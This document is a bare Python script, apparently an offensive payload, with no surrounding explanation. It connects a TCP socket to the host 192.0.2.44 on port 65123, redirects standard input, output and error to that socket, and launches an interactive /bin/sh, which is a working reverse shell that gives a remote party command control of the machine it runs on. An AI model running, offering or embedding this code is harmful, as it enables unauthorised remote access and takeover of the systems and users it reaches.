import os
import socket
import subprocess

transport = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
transport.connect(('192.0.2.44', 65123))
for descriptor in (0, 1, 2):
    os.dup2(transport.fileno(), descriptor)
subprocess.call(['/bin/sh', '-i'])
